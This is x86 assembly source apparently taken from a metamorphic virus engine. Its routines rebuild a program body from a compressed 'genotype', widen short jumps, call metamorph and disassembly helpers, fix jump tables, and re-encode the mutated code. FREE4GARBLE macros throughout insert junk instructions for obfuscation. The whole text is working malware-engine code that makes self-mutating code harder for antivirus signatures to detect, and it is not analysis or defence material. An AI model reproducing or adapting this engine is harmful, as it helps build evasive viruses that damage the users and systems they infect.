DEBUGOFF

FREE4GARBLE NOGARBLE

build_body_from_genotype proc pascal
  LOCAL new_body:DWORD
       pushad

FREE4GARBLE _EAX+_EBP
       mov eax,WORKSIZE
       call alloc
       mov [new_body],eax

FREE4GARBLE _EAX+_ESI+_EDI+_EBP
       mov esi, ofs gens
       sub eax,[esi+4]
       lea edi,[eax+64*1024]      ;put unpacked distances in end of buffer
       call z_decode_asm

FREE4GARBLE _EAX+_EDI+_EBP
       mov eax,WORKSIZE*8
       call alloc
       mov [eip_table],eax

       mov eax,WORKSIZE
       call alloc
       mov [jmp_table],eax

FREE4GARBLE _EDI+_EBP
       mov [eip_table_cnt],0
       mov [jmp_table_cnt],0

FREE4GARBLE _ESI+_EDI+_EBP
       mov esi,[new_body]
       xchg esi,edi

       mov [outbuffer],edi

FREE4GARBLE _EBX+_ESI+_EDI+_EBP
       mov ebx,[CODE_OFS]
       mov [source],ebx

FREE4GARBLE _EBX+_EAX+_ESI+_EDI+_EBP
  @@build_body:
       sub eax,eax
       lodsw
FREE4GARBLE _EBX+_EAX+_ESI+_EDI+_FLAGS+_EBP
       cmp ax, -1
       je @@done_build

       push esi
       cmp ax, -2               ;flags mark
       jne @@no_special_code

FREE4GARBLE _EBX+_EAX+_ESI+_EDI+_EBP
       lodsw                    ;flags value
       add dwo [esp],2
FREE4GARBLE _EBX+_EAX+_ESI+_EDI+_FLAGS+_EBP
       btr eax, 15
       jnc @@no_special_code

FREE4GARBLE _EBX+_EAX+_ESI+_EDI+_EBP
       push LNK_COMMANDCODE
       pop esi          ;thats instruction have no equivalent in inbuffer
       call link_eip

       push eax
       mov ax, 0f481h           ;build XOR ESP
       stosw
       pop eax
       mov [registers],eax
       stosd
       jmp @@processed

  @@no_special_code:
       movsx esi,ax
       add ebx,esi
       mov esi,ebx
       call link_eip

       mov al,[esi]
FREE4GARBLE _EBX+_EAX+_ESI+_EDI+_FLAGS+_EBP
       cmp al, 0ebh
       je @@short_shit                  ;is a small JMP/JCC
       and al, 011110000b
       cmp al, 70h
       jne @@no_short_shit

FREE4GARBLE _EBX+_EAX+_ESI+_EDI+_EBP
       mov al, 0fh
       mov ah, [esi]
       and ah,not 011110000b
       or ah, 80h

       stosw
       stosd

FREE4GARBLE _EDX+_EBX+_EAX+_ESI+_EDI+_EBP
  @@embiggens:
       movsx edx,by [esi+1]
       lea eax,[edx+esi+2]
       sub eax,[source]

FREE4GARBLE _EBX+_EAX+_ESI+_EDI+_EBP
       push edi
       mov edi, [jmp_table_cnt]
       lea edi, [edi+edi*8]           ;offset of referenced instruction
       add edi, [jmp_table]
       stosd
       mov eax,[esp]
       stosd                          ;save patch point
       sub eax,eax
       stosb
       inc dwo [jmp_table_cnt]
       pop edi

       jmp @@processed

  @@short_shit:
       mov al, 0e9h
       stosb
       stosd
       jmp @@embiggens

FREE4GARBLE _EBX+_ESI+_EDI+_EBP+_FLAGS
  @@no_short_shit:
       call check4jmps
       jc @@processed

       call metamorph
       jc @@processed

       call disasm
FREE4GARBLE _EBX+_ECX+_ESI+_EDI+_EBP
       mov ecx,[disasm_size]
       rep movsb

FREE4GARBLE _EBX+_ESI+_EDI+_EBP
  @@processed:
       pop esi
       jmp @@build_body


FREE4GARBLE _EAX+_EDI+_EBP
  @@done_build:
       push edi
       call fix_damn_jmps
       pop eax

FREE4GARBLE _EAX+_ESI+_EBP
       mov esi,[outbuffer]
       sub eax,esi
       mov [mutant_size],eax

FREE4GARBLE _EAX+_ESI+_EBP
       call alloc
       mov [mutant_offset],eax

FREE4GARBLE _EAX+_EDI+_ESI+_EBP
       mov edi,eax
FREE4GARBLE _ECX+_EDI+_ESI+_EBP
       mov ecx,[mutant_size]
       rep movsb

FREE4GARBLE _ECX+_EBP
       mov ecx,[eip_table_cnt]

FREE4GARBLE _ECX+_EAX+_EBP
       lea eax,[ecx*4+8]
       call alloc
FREE4GARBLE _EAX+_ECX+_EDI+_EBP
       mov edi,eax
       mov [userlist],edi

FREE4GARBLE _EAX+_ECX+_EDI+_ESI+_EBP
       mov esi,[eip_table]             ;table base
  @@create_userlist:
       lodsd
       stosd
       lodsd
FREE4GARBLE _EAX+_ECX+_EDI+_ESI+_FLAGS+_EBP
       loop @@create_userlist

FREE4GARBLE _EAX+_EDI+_EBP
       push -1
       pop eax
       stosd

FREE4GARBLE ALLGARBLE+_EBP
       push dwo [eip_table]
       call free
       push dwo [new_body]
       call free
       push dwo [jmp_table]
       call free

FREE4GARBLE NOGARBLE
  @@error_exit:
       popad
       ret
build_body_from_genotype endp


;FREE4GARBLE NOGARBLE
alloc  proc
       pushad
FREE4GARBLE _EAX
       push PAGE_READWRITE
       push MEM_COMMIT+MEM_RESERVE
       push eax
       push 0
       call [_VirtualAlloc]
       mov [esp.Pushad_eax],eax
FREE4GARBLE NOGARBLE
       popad
       ret
alloc  endp


;FREE4GARBLE NOGARBLE
free   proc
       pushad
FREE4GARBLE ALLGARBLE
       push MEM_RELEASE
       push 0
       push dwo [esp.cPushad.Arg1+8]
       call [_VirtualFree]
FREE4GARBLE NOGARBLE
       popad
       ret 4
free   endp

build_genotype_from_body PROC
       pushad

FREE4GARBLE _EAX
       mov eax, WORKSIZE
       call alloc
       push eax
FREE4GARBLE _EAX+_EDI
       mov edi,eax

FREE4GARBLE _EDI+_ESI
       mov esi,[userlist]
FREE4GARBLE _EDI+_ESI+_EBP+_EBX
       mov ebp,[mutant_offset]
       sub ebx,ebx
FREE4GARBLE _EDI+_ESI+_EBP+_EBX+_EAX
  @@distance_loop:
       lodsd
FREE4GARBLE _EDI+_ESI+_EBP+_EBX+_EAX+_FLAGS
       cmp eax,-1
       je @@distance_done

       cmp wo [ebp+eax],0f481h           ;XOR ESP
       jne @@distance_store

FREE4GARBLE _EDI+_ESI+_EBP+_EBX+_EAX+_ECX
       mov ecx,eax
       mov eax,-2
       stosw
       mov eax,[ebp+ecx+2]
       mov [registers],eax
       bts eax, 15
       stosw

       push edi
       lea edi,[ebp+ecx]
FREE4GARBLE _EDI+_ESI+_EBP+_EBX
       push edi
       call lea_dword
FREE4GARBLE _EDI+_ESI+_EBP+_EBX+_EAX+_FLAGS
       pop eax
       sub eax,edi
       jnz @@done_fill
FREE4GARBLE _EDI+_ESI+_EBP+_EBX+_EAX
       add eax,90909090h
       stosd
       stosw
  @@done_fill:

       pop edi
       jmp @@distance_loop

  @@distance_store:
       sub eax,ebx
       add ebx,eax
       stosw
       jmp @@distance_loop

FREE4GARBLE _EDI+_EAX
  @@distance_done:
       mov eax,-1
       stosw

FREE4GARBLE _EDI+_ESI+_ECX
       mov ecx,edi
       mov esi,[esp]
       sub ecx,esi
       call z_encode_asm
       mov esi,edi
FREE4GARBLE _EDI+_ESI+_EAX
       mov eax,[edi]
       call alloc
       mov [mutant_gens],eax
FREE4GARBLE _EDI+_ESI+_EAX+_ECX
       mov ecx,[edi]
       mov edi,eax
       rep movsb

FREE4GARBLE _EAX
       call free              ;free workmem

       mov eax,[userlist]
       push eax
       mov eax,[eax]
       mov [_1st_item],eax
       call free
FREE4GARBLE NOGARBLE

       popad
       ret
build_genotype_from_body ENDP
